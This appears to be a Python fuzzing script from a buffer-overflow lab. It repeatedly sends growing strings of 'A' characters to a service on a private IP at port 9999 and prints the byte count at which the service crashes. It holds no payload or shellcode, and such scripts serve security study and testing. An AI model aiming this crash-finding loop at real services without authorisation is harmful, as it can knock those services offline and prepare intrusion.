#!/usr/bin/python
import sys, socket
from time import sleep

###############################

IP = "192.168.10.12"
PORT = 9999

###############################

buffer = "A" * 100


while True:
        try: 
                 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                 s.connect((IP,PORT))

                 s.send((buffer))
                 #s.send(('accept/.:/' + buffer))
                 s.close()
                 sleep(1)
                 buffer = buffer + "A"*100
        except: 
                 print ("Fuzzing Crashed at %s bytes" % str(len(buffer)))
                 sys.exit()
